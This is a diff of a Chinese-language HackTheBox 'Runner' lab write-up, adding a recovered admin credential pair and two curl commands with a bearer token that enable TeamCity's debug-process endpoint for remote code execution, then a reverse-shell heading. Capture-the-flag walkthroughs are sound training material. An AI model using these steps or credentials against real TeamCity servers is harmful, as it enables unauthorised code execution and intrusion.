@@ -529,10 +529,26 @@ https://breachforums.st/Thread-HackTheBox-Runner-Writeup?highlight=runner
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422024653.png)
 
 使用`searchsploit`可以直接搜索到这个漏洞,但是我是用kali没成功,换到win上成功了(代码没变),跟vpn连接的位置有关?
+得到一个admin账号密码 `city_adminkIxr`/`Main_password!!**`
 
-该怎么通过后台rce,找到一个ruby的代码,根据代码和报错构造了一下web请求
+---
+好像是因为共享靶机跳过了一步,需要配置rest.debug.processes.enable开启
+https://www.ctfiot.com/141977.html
+```bash
+curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UmFYd29SRVlLUzd3RUNIa1Jpem81MkNfZjlN.ZjhjZDljNzktNDFiMS00OGE2LWE2ZDQtNzcwOGQ1ZjRhNWU2" -X POST http://192.168.86.50:8111/admin/dataDir.html?action=edit^&fileName=config%2Finternal.properties^&content=rest.debug.processes.enable=true
+```
+
+```bash
+curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UmFYd29SRVlLUzd3RUNIa1Jpem81MkNfZjlN.ZjhjZDljNzktNDFiMS00OGE2LWE2ZDQtNzcwOGQ1ZjRhNWU2" http://192.168.86.50:8111/admin/admin.html?item=diagnostics^&tab=dataDir^&file=config/internal.properties
+
+```
+
+
+通过后台rce,找到一个ruby的代码,根据代码和报错构造了一下web请求
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422033608.png)
 要添加一个`X-TC-CSRF-Token`头,随便给个值真正的值他就会告诉你,防止csrf的
+
+
 
 反弹一个shell
 
